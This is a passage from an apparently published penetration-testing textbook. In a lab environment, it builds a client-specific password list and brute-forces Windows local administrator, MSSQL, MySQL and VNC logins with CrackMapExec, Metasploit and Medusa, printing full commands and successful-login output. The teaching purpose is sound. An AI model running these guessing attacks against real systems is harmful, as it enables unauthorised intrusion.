10 password1!            
11 password2019            
12 password2019!           
13 Password            
14 Password1            
15 Password!            
16 Password1!            
17 Password2019           
18 Password2019!      
19 capsulecorp         
20 capsulecorp1        
21 capsulecorp!        
22 capsulecorp1!       
23 capsulecorp2019     
24 capsulecorp2019!   
25 Capsulecorp        
26 Capsulecorp1        
27 Capsulecorp!        
28 Capsulecorp1!        
29 Capsulecorp2019     
30 Capsulecorp2019!   
~                            
NORMAL > ./passwords.txt >  , admin, root, guest, sa, and changeme—are com-
monly used passwords, so they make their way onto the roster as well. This list is
intended to be short and therefore fast. Of course, you could increase your chances by
adding additional passwords to the list. If you do, I recommend sticking with the same
formula: find your base word and then create 12 permutations of it. Keep in mind,
though, that the more passwords you add, the longer it will take you to conduct brute-
force guessing against the entire target list.
12 permutations of 
the word “password”
12 permutations of the 
word “capsulecorp”
Exercise 4.2: Creating a client-specific password list
Follow the steps outlined in this section to create a password list specific to your test-
ing environment. If you are using the Capsulecorp Pentest environment, the password
list from listing 4.3 will do fine. Store this list in your vulnerabilities directory, and
name it something like password-list.txt.
68
CHAPTER 4
Discovering network vulnerabilities
4.3.2
Brute-forcing local Windows account passwords
Let’s move on with this engagement and see if we can discover some vulnerable hosts.
Pentesters typically start with Windows hosts because they tend to bear more fruit if
compromised. Most companies rely on Microsoft Active Directory to manage authen-
tication for all users, so owning the entire domain is usually a high priority for an
attacker. Due to the vast landscape of Windows-based attack vectors, once you get onto
a single Windows system that’s joined to a domain, it’s usually possible to escalate all
the way up to Domain Admin from there.
 Brute-force password guessing against Active Directory accounts is possible, but it
requires some knowledge about the account lockout policy. Because of the increased
risk of locking out a bunch of users and causing an outage for your client, most pen-
testers opt to focus on local administrator accounts, which are often configured to
ignore failed logins and never generate an account lockout. That’s what we’re going
to do. 
Here’s how to use CME along with our password list to target the UID 500 local
administrator account on all the Windows systems we identified during host discovery.
Run the cme command with the following options to iterate through your list of pass-
word guesses against the local administrator account on all Windows hosts in your
windows.txt targets file:
cme smb discovery/hosts/windows.txt --local-auth -u Administrator
➥ -p passwords.txt
Optionally, you can pipe the cme command to grep -v '[-]' for less verbose output
that is easier to sort through visually. Here is an example of what that looks like.
CME     10.0.10.200:445 GOKU      [*] Windows 10.0 Build 17763 (name:GOKU)
(domain:CAPSULECORP)
CME     10.0.10.201:445 GOHAN      [*] Windows 10.0 Build 14393
(name:GOHAN) (domain:CAPSULECORP)
CME     10.0.10.206:445 YAMCHA     [*] Windows 10.0 Build 17763
(name:YAMCHA) (domain:CAPSULECORP)
CME     10.0.10.202:445 VEGETA     [*] Windows 6.3 Build 9600 (name:VEGETA)
Listing 4.4
Using CME to guess local account passwords
More about account lockouts
It’s important to be conscious of the account lockout threshold when guessing pass-
words against Microsoft Active Directory user accounts. The local administrator
account (UID 500) is typically safe to guess against because the default behavior for
this account avoids being locked out due to multiple failed login attempts. This fea-
ture helps protect IT/system administrators from accidentally locking themselves out
of a Windows machine.
69
Discovering authentication vulnerabilities
(domain:CAPSULECORP)
CME     10.0.10.207:445 RADITZ     [*] Windows 10.0 Build 14393
(name:RADITZ) (domain:CAPSULECORP)
CME     10.0.10.203:445 TRUNKS     [*] Windows 6.3 Build 9600 (name:TRUNKS)
(domain:CAPSULECORP)
CME     10.0.10.208:445 TIEN      [*] Windows 6.1 Build 7601 (name:TIEN)
(domain:CAPSULECORP)
CME     10.0.10.205:445 KRILLIN     [*] Windows 10.0 Build 17763
(name:KRILLIN) (domain:CAPSULECORP)
CME     10.0.10.202:445 VEGETA     [+] VEGETA\Administrator:Password1!
(Pwn3d!)    
CME     10.0.10.201:445 GOHAN      [+] GOHAN\Administrator:capsulecorp2019!
(Pwn3d!)    #A
This output is pretty self-explanatory. CME was able to determine that two of our Win-
dows targets are using a password in the password list that we created. This means we
can log in to those two systems with administrator-level privileges and do whatever we
want. If we were real attackers, this would be very bad for our client. Let’s make a note
of these two vulnerable systems and continue with our password guessing and vulnera-
bility discovery. 
TIP
Taking detailed notes is important, and I recommend using a program
you are comfortable with. I’ve seen people use something as simple as an
ASCII text editor, all the way to installing an entire wiki on their local pentest
system. I like to use Evernote. You should choose whatever works best for
you—but choose something, and take thorough notes throughout your
engagement.
4.3.3
Brute-forcing MSSQL and MySQL database passwords
Next on the list are database servers. Specifically, during service discovery, we found
instances of Microsoft SQL Server (MSSQL) and MySQL. For both of these protocols,
we can use Metasploit to perform brute-force password guessing. Let’s begin with
CME issues the text string “Pwn3d!” to let us know the credentials
have administrator privileges on the target machine.
Does password guessing generate logs?
Absolutely yes, it does. I am often surprised at how many companies ignore the logs
or configure them to auto-purge on a daily or weekly basis to save disk storage space. 
The more involved with pentesting you become, the more people you will see who blur
the lines between vulnerability assessments, pentests, and red team engagements.
It’s wise to concern yourself with whether your activity is showing up in a log when
conducting a full-scale red team engagement. A typical INPT, however, is far from a
red team engagement and does not involve a stealth component where the goal is to
remain undetected as long as possible. If you’re working on an INPT, you shouldn’t
be concerned with generating log entries.
70
CHAPTER 4
Discovering network vulnerabilities
MSSQL. Fire up the Metasploit msfconsole, type use auxiliary/scanner/mssql/
mssql_login, and press Enter. This will place you in the MSSQL login module, where
you need to set the username, pass_file, and rhosts variables. 
 In a typical MSSQL database setup, the username for the administrator account is
sa (SQL Administrator), so we’ll stick with that. That should already be the default
value. If it isn’t, you can set it with set username sa. Also set the rhosts variable to the
file that contains the MSSQL targets you enumerated during service discovery: set
rhosts file:/path/to/your/mssql.txt file. Finally, set the pass_file variable to be
the path of the password list you created; in my case, I’ll type set pass_file
/home/royce/capsulecorp/passwords.txt. Now you can run the module by typing
run. 
msf5 > use auxiliary/scanner/mssql/mssql_login 
msf5 auxiliary(scanner/mssql/mssql_login) > set username sa
username => sa
msf5 auxiliary(scanner/mssql/mssql_login) > set pass_file
/home/royce/capsulecorp/passwords.txt
pass_file => /home/royce/capsulecorp/passwords.txt
msf5 auxiliary(scanner/mssql/mssql_login) > set rhosts
file:/home/royce/capsulecorp/discovery/hosts/mssql.txt
rhosts => file:/home/royce/capsulecorp/discovery/hosts/mssql.txt
msf5 auxiliary(scanner/mssql/mssql_login) > run
[*] 10.0.10.201:1433   - 10.0.10.201:1433 - MSSQL - Starting authentication
scanner.
[-] 10.0.10.201:1433   - 10.0.10.201:1433 - LOGIN FAILED:
WORKSTATION\sa:admin (Incorrect: )
[-] 10.0.10.201:1433   - 10.0.10.201:1433 - LOGIN FAILED:
WORKSTATION\sa:root (Incorrect: )
[-] 10.0.10.201:1433   - 10.0.10.201:1433 - LOGIN FAILED:
WORKSTATION\sa:password (Incorrect: )
[+] 10.0.10.201:1433   - 10.0.10.201:1433 - Login Successful:
WORKSTATION\sa:Password1 
[*] 10.0.10.201:1433   - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/mssql/mssql_login) >
Another successful login! If this MSSQL server is configured to allow the xp_cmdshell
stored procedure, we can use this vulnerability to execute operating system com-
mands on this target remotely. As an added bonus, if the stored procedure is disabled
(as it is by default in most modern MSSQL instances), we can enable it because we
have the sa account, which has full administrator privileges on the database. 
 As with the last authentication vulnerability we found, make a note of this one for
now, and we’ll move on. Remember our Hollywood movie heist scenario: the crew can’t
just go waltzing into the first unlocked door they find without a plan of attack. We need
Listing 4.5
Using Metasploit to guess MSSQL passwords
A successful login with the
username “sa” and the
password “Password1”
71
Discovering authentication vulnerabilities
to do the same thing. For now, we’re simply identifying attack vectors. Resist the urge
to penetrate further into systems during this component of your engagement.
We’ll also use Metasploit to test the MySQL servers we found for weak passwords. This
will look very similar to what you did with the MSSQL module. Start by switching to
the MySQL module by typing use auxiliary/scanner/mysql/mysql_login. Then set
the rhosts and pass_file variables as you did before. Be careful to select the correct
rhosts file. For this module, we don’t need to worry about changing the username
because the default MySQL user account root is already populated for us, so we can
just type run to launch the module.
msf5 > use auxiliary/scanner/mysql/mysql_login 
msf5 auxiliary(scanner/mysql/mysql_login) > set rhosts
file:/home/royce/capsulecorp/discovery/hosts/mysql.txt
rhosts => file:/home/royce/capsulecorp/discovery/hosts/mysql.txt
msf5 auxiliary(scanner/mysql/mysql_login) > set pass_file
/home/royce/capsulecorp/passwords.txt
pass_file => /home/royce/capsulecorp/passwords.txt
msf5 auxiliary(scanner/mysql/mysql_login) > run
[-] 10.0.10.203:3306   - 10.0.10.203:3306 - Unsupported target version of
MySQL detected. Skipping.    
[*] 10.0.10.203:3306   - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/mysql/mysql_login) >
Listing 4.6
Using Metasploit to guess MySQL passwords
What is a stored procedure?
Think of stored procedures as additional functions you can call from within an MSSQL
database server. The xp_cmdshell stored procedure is used to spawn a Windows
command shell and pass in a string parameter that is to be executed as an operating
system command. Check out the Microsoft Docs write-up at http://mng.bz/pzx5 for
more information about xp_cmdshell.
Why not just penetrate the MSSQL host now?
Early in my career, I failed to follow the advice to wait. As soon as I found a weak
password or a missing patch, I went straight to penetrating that target. Sometimes I
got lucky and it led to network-wide compromise. Other times I spent hours or even
days chasing down a dead end, only to go back to the drawing board and find a new
vulnerable host that led me straight to my end-game objective. Because of this I
learned to spend a lot of time during vulnerability discovery. Only after you’ve identi-
fied every possible attack path can you make an educated decision about which
strings to tug on and in which order.
Potentially misleading error
message. Use Medusa to verify.
72
CHAPTER 4
Discovering network vulnerabilities
The error message “Unsupported target version of MySQL detected” is potentially
misleading. It may mean the target MySQL server is running a version that’s incom-
patible with Metasploit and therefore password guessing is not a viable avenue. How-
ever, I have seen this message enough times to know that it may mean something else.
The target MySQL server may be configured to allow only local logins, so only an
application or user already logged on to the system can access the MySQL server tar-
geting the local loopback IP address of 127.0.0.1. We can use Medusa to verify this.
You should already have installed medusa on your system; if it’s not there, install it by
typing sudo apt install medusa -y. Now run the following command: 
medusa -M mysql -H discovery/hosts/mysql.txt -u root -P passwords.txt 
~$ medusa -M mysql -H discovery/hosts/mysql.txt -u root -P passwords.txt 
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks
ERROR: mysql.mod: Failed to retrieve server version: Host '10.0.10.160' 
is not allowed to connect to this MariaDB server 
ERROR: [mysql.mod] Failed to initialize MySQL connection (10.0.10.203).
It looks like our suspicion has been confirmed. We can see from the error message
“Host ‘10.0.10.160’ is not allowed to connect” that the MySQL server is not allowing
connections from our IP address. We will have to find another avenue of attack to
penetrate this target.
TIP
The presence of MySQL on a server suggests a high probability that a
database-driven web application also resides on that system. If you run into
this type of behavior, make a note of it and return to the system when you
begin targeting web services for vulnerability discovery.
4.3.4
Brute-forcing VNC passwords
VNC is a popular remote management solution despite the fact that most VNC prod-
ucts lack encryption and don’t integrate with centralized authentication systems. It’s
very common to see them on a network pentest; they are rarely configured with an
account lockout and thus are ideal targets for brute-force password guessing. Here is
how to use the Metasploit vnc_login auxiliary module to launch an attack against a list
of hosts running VNC. 
 Just as with the previous modules demonstrated in this chapter, load the vnc_login
module by typing use auxiliary/scanner/vnc/vnc_login. Then use the set rhosts
command to point to your vnc.txt file, which should be in your discovery/hosts folder.
Set pass_file to your passwords.txt file, and type run to run the module. You’ll notice
Listing 4.7
Using Medusa to guess MySQL passwords
Confirmation that the host is not
accepting logins from our IP address
73
Discovering authentication vulnerabilities
from the module’s output in the next listing that one of the target VNC servers has a
weak password: admin.
msf5 > use auxiliary/scanner/vnc/vnc_login 
msf5 auxiliary(scanner/vnc/vnc_login) > set rhosts
file:/home/royce/capsulecorp/discovery/hosts/vnc.txt
rhosts => file:/home/royce/capsulecorp/discovery/hosts/vnc.txt
msf5 auxiliary(scanner/vnc/vnc_login) > set pass_file
/home/royce/capsulecorp/passwords.txt
pass_file => /home/royce/capsulecorp/passwords.txt
msf5 auxiliary(scanner/vnc/vnc_login) > run
[*] 10.0.10.205:5900   - 10.0.10.205:5900 - Starting VNC login 
[-] 10.0.10.205:5900   - 10.0.10.205:5900 - LOGIN FAILED: :admin
(Incorrect: No supported authentication method found.)
[-] 10.0.10.205:5900   - 10.0.10.205:5900 - LOGIN FAILED: :root 
(Incorrect: No supported authentication method found.)
[-] 10.0.10.205:5900   - 10.0.10.205:5900 - LOGIN FAILED: :password
(Incorrect: No supported authentication method found.)
[-] 10.0.10.205:5900   - 10.0.10.205:5900 - LOGIN FAILED: :Password1
(Incorrect: No supported authentication method found.)
[-] 10.0.10.205:5900   - 10.0.10.205:5900 - LOGIN FAILED: :Password2
(Incorrect: No supported authentication method found.)
[-] 10.0.10.205:5900   - 10.0.10.205:5900 - LOGIN FAILED: :Password3
(Incorrect: No supported authentication method found.)
[-] 10.0.10.205:5900   - 10.0.10.205:5900 - LOGIN FAILED: :Password1!
(Incorrect: No supported authentication method found.)
[-] 10.0.10.205:5900   - 10.0.10.205:5900 - LOGIN FAILED: :Password2!
(Incorrect: No supported authentication method found.)
[-] 10.0.10.205:5900   - 10.0.10.205:5900 - LOGIN FAILED: :Password3!
(Incorrect: No supported authentication method found.)
[-] 10.0.10.205:5900   - 10.0.10.205:5900 - LOGIN FAILED: :capsulecorp
(Incorrect: No supported authentication method found.)
[-] 10.0.10.205:5900   - 10.0.10.205:5900 - LOGIN FAILED: :Capsulecorp1
(Incorrect: No supported authentication method found.)
[-] 10.0.10.205:5900   - 10.0.10.205:5900 - LOGIN FAILED: :Capsulecorp2
(Incorrect: No supported authentication method found.)
[-] 10.0.10.205:5900   - 10.0.10.205:5900 - LOGIN FAILED: :Capsulecorp3
(Incorrect: No supported authentication method found.)
[-] 10.0.10.205:5900   - 10.0.10.205:5900 - LOGIN FAILED: :Capsulecorp1!
(Incorrect: No supported authentication method found.)
[-] 10.0.10.205:5900   - 10.0.10.205:5900 - LOGIN FAILED: :Capsulecorp2!
(Incorrect: No supported authentication method found.)
[-] 10.0.10.205:5900   - 10.0.10.205:5900 - LOGIN FAILED: :Capsulecorp3!
(Incorrect: No supported authentication method found.)
[*] Scanned 1 of 2 hosts (50% complete)
[*] 10.0.10.206:5900   - 10.0.10.206:5900 - Starting VNC login 
[+] 10.0.10.206:5900   - 10.0.10.206:5900 - Login Successful: :admin 
[-] 10.0.10.206:5900   - 10.0.10.206:5900 - LOGIN FAILED: :root (Incorrect:
No authentication types available: Your connection has been rejected.)
[-] 10.0.10.206:5900   - 10.0.10.206:5900 - LOGIN FAILED: :password
(Incorrect: No authentication types available: Your connection has been
Listing 4.8
Using Metasploit to guess VNC passwords
A successful login with the
password “admin”
74
CHAPTER 4
Discovering network vulnerabilities
rejected.)